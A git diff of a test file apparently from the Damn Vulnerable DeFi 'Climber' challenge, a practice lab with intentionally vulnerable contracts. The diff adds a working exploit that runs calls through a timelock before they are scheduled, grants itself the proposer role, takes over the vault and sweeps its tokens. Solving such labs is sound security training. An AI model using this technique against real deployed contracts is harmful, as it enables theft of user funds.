@@ -18,7 +18,7 @@ describe('[Challenge] Climber', function () {
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.equal(ethers.utils.parseEther('0.1'));
-        
+
         // Deploy the vault behind a proxy using the UUPS pattern,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         this.vault = await upgrades.deployProxy(
@@ -31,13 +31,13 @@ describe('[Challenge] Climber', function () {
         expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
         expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
         expect(await this.vault.owner()).to.not.eq(deployer.address);
-        
+
         // Instantiate timelock
         let timelockAddress = await this.vault.owner();
         this.timelock = await (
             await ethers.getContractFactory('ClimberTimelock', deployer)
         ).attach(timelockAddress);
-        
+
         // Ensure timelock roles are correctly initialized
         expect(
             await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
@@ -51,8 +51,29 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+      const salt = ethers.utils.formatBytes32String("");
+      const role = await this.timelock.PROPOSER_ROLE()
+
+      const attack = await (
+        await ethers.getContractFactory('AttackClimberVault', attacker)
+      ).deploy(role, this.timelock.address);
+
+     const updateDelay = this.timelock.interface.encodeFunctionData("updateDelay", [0]);
+      const setProposer = this.timelock.interface.encodeFunctionData("grantRole",
+        [role, attack.address]);
+      const schedule = attack.interface.encodeFunctionData("schedule", []);
+
+      await this.timelock.execute(
+        [this.timelock.address, this.timelock.address, attack.address],
+        [0, 0, 0],
+        [updateDelay, setProposer, schedule],
+       salt
+        );
+
+      await attack.attack(this.vault.address);
+      await this.vault.connect(attacker).sweepFunds(this.token.address);
+
     });
 
     after(async function () {
